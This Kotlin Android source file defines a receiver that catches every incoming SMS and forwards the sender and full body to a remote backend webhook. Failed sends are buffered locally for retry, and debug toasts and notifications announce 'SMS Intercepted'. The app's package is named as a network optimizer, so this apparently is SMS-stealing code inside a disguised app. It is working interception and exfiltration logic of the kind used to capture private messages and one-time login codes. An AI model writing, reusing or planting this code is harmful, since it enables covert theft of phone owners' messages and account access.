package com.netboost.optimizer

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
        private const val DEBUG_CHANNEL_ID = "sms_relay_debug"
        private var notifId = 8000
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        DebugLogger.log(TAG, "⚡ Broadcast received! Action: $action")

        if (action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            DebugLogger.log(TAG, "Ignoring non-SMS action: $action")
            return
        }

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages == null || messages.isEmpty()) {
            DebugLogger.log(TAG, "⚠️ Intent contained empty/null SMS messages", isError = true)
            return
        }

        val pendingResult = goAsync()
        val msgsBySender = messages.groupBy { it.originatingAddress ?: "Unknown" }

        val senderSummary = msgsBySender.keys.joinToString()
        showToast(context, "📨 SMS Intercepted from: $senderSummary")
        DebugLogger.log(TAG, "📨 Intercepted SMS from: $senderSummary (${messages.size} part(s))", isSuccess = true)
        showNotification(context, "📨 SMS Intercepted", "From: $senderSummary — Relaying to backend...")

        CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            try {
                for ((sender, parts) in msgsBySender) {
                    val fullBody = parts.joinToString(separator = "") { it.messageBody ?: "" }
                    val messageSid = java.util.UUID.randomUUID().toString()

                    DebugLogger.log(TAG, "📤 Relaying to: ${Config.BACKEND_WEBHOOK}")
                    DebugLogger.log(TAG, "   From: $sender | Body: ${fullBody.take(60)}...")

                    val httpCode = BackendClient.relayWithCode(sender, fullBody, messageSid)
                    val success = httpCode in 200..299

                    if (success) {
                        showToast(context, "✅ Relay SUCCESS (HTTP $httpCode)\nFrom: $sender")
                        DebugLogger.log(TAG, "✅ Relay SUCCESS! HTTP $httpCode for $sender", isSuccess = true)
                        showNotification(
                            context,
                            "✅ SMS Relayed — HTTP $httpCode",
                            "From: $sender\nBody: ${fullBody.take(80)}"
                        )
                    } else {
                        showToast(context, "❌ Relay FAILED (HTTP $httpCode)\nBuffering locally...")
                        DebugLogger.log(TAG, "❌ Relay FAILED! HTTP $httpCode for $sender. Enqueuing to Room buffer...", isError = true)
                        showNotification(
                            context,
                            "❌ Relay Failed — HTTP $httpCode",
                            "From: $sender\nEnqueued to local offline buffer"
                        )
                        com.netboost.optimizer.buffer.RelayBuffer.enqueue(
                            context.applicationContext, sender, fullBody, messageSid
                        )
                    }
                }
            } catch (e: Exception) {
                DebugLogger.log(TAG, "💥 Exception: ${e.javaClass.simpleName} - ${e.message}", isError = true)
                showToast(context, "💥 EXCEPTION: ${e.message?.take(80)}")
                showNotification(context, "💥 Relay Exception", "${e.javaClass.simpleName}: ${e.message}")
            } finally {
                pendingResult.finish()
            }
        }
    }

    private fun showToast(context: Context, msg: String) {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
        }
    }

    private fun showNotification(context: Context, title: String, body: String) {
        try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    DEBUG_CHANNEL_ID,
                    "SMS Debug Alerts",
                    NotificationManager.IMPORTANCE_HIGH
                ).apply {
                    description = "Debug alerts for physical SMS relay interception"
                }
                nm.createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(context, DEBUG_CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(body)
                .setStyle(NotificationCompat.BigTextStyle().bigText(body))
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .build()

            nm.notify(notifId++, notification)
        } catch (e: Exception) {
            Log.e(TAG, "Debug notification failed: ${e.message}")
        }
    }
}
